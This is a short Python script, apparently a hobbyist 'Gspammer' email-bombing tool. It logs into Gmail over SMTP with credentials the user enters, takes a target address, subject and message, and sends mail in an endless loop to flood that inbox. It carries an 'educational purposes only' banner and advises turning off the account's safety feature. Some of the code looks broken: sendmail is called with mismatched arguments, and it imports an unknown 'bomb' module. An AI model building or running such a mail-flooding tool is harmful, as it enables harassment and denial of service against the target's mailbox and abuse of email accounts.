import smtplib
import getpass
import time
import bomb


print("If Your Using this just to spam i suggest making a new account and un enabling the safety feature for it to work.\n")

ENDC = '\033[m'
TCYAN =  '\033[36m'
TYELL = '\033[33m'
print(TCYAN + "[*] Welcome To SheZco's Gspammer", ENDC)
print(TYELL + "[*] Please Use For Educational Purposes only")

print('''              . . .
              \|/
            `--+--'
              /|/
             ' | '
               |
               |
           ,--'#`--.
           |#######|
        _.-'#######`-._
     ,-'###############`-.
   ,'#####################`,
  /#########################/
 |###########################|
|#############################|
|#############################|
|#############################|
|#############################|
 |###########################|
  \#########################/
   `.#####################,'
     `._###############_,'
        `--..#####..--'

------------------------------------------------
 ''')

user = input("[!] Enter your gmail: ")
passwd = getpass.getpass("[!] Enter your pass: ")


counter = 1
try:
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.ehlo()
    server.starttls()
    server.login(user, passwd)
    print("Successfully Logged In as " + user)

except:
    print("Wrong Password Or Gmail... password was " + passwd)

target = input("[!] Enter Target gmail: ")
subj = input("[?] Subject: ")
msg = input("[?] Message: ")

while True:
    try:
        counter += 1
        server.sendmail(user, target, subj, msg)
        print("Succesfully sent %s " % counter)
    except:
        print("Cant send or sent enough and restarting, manuel restart me")
        quit()
